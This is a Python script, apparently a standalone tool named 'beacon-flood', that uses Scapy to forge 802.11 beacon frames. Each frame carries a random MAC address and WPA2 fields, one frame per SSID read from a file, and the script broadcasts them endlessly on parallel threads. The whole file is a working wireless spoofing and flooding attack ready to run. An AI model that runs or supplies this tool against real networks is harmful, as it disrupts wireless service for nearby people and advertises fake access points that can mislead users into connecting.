from scapy.layers.dot11 import *
import threading
from random import randrange
import argparse
from argparse import RawTextHelpFormatter

# from scapy.config import conf
def random_mac_addr():
    random_list = [format(randrange(0,256), '02x') for i in range(6)]
    return ':'.join(random_list)

def beacon_flood(SSID):
    rmac_add = random_mac_addr()
    base_pkt = Dot11(type=0, subtype=8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = rmac_add, addr3 = rmac_add)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    rate=Dot11EltRates(rates=[130])
    rsn = Dot11EltRSN(ID=48, group_cipher_suite=RSNCipherSuite(cipher=0x4), pairwise_cipher_suites=RSNCipherSuite(cipher=0x04), akm_suites=[RSNCipherSuite(cipher=0x02)])

    frame = RadioTap()/base_pkt/beacon/essid/rate/rsn
    print(frame)
    sendp(frame, iface=iface, verbose=False, loop=1, inter=0.1)

parser = argparse.ArgumentParser(description='beacon-flood\n\nusage: python3 beacon-flood.py <interface> <ssid-list-file>',formatter_class=RawTextHelpFormatter)
parser.add_argument('iface', help='<interface>')
parser.add_argument('ssid_list', help='<ssid-list-file>')

args = parser.parse_args()

# conf.logLevel = 0
with open(args.ssid_list, 'rb') as f:
    SSID_list = f.read().decode().split('\n')[:-1]

iface = args.iface

for SSID in SSID_list:
    t = threading.Thread(target=beacon_flood, args=(SSID, ))
    t.start()